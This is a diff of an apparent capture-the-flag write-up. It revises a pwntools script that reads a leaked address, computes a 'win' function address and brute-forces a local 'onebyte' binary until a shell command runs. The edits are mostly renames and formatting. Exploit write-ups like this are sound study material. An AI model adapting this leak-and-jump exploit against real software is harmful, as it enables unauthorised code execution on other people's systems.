@@ -302,7 +302,8 @@ Here's a working solution:
 ```python
 from pwn import *
 
-def send_exploit(p, command) -> str:
+
+def exploit(p, command) -> str:
     p.recvuntil(b"Free junk: 0x")
     init_address = int(p.recv(8).decode(), 16)
     win_address = init_address + 70
@@ -312,25 +313,26 @@ def send_exploit(p, command) -> str:
     p.sendline(command.encode())
     return p.recvline().decode()
 
-def brute_force(binary_path, command, match): 
+
+def bruteforce(binary_path, command, match):
     flag = None
     while not flag:
         p = process(binary_path)
         try:
-            response = send_exploit(p, command)
+            response = exploit(p, command)
             if match in response:
                 flag = response
         except EOFError:
             pass
-        finally:
-            p.close()    
+        p.close()
     return flag
+
 
 if __name__ == "__main__":
     try:
-        print(brute_force("/home/kali/onebyte", "whoami", "kali"))
+        print(bruteforce("/home/kali/onebyte", "whoami", "kali"))
     except KeyboardInterrupt:
-        pass
+        pass 
 ```
 
 Output:
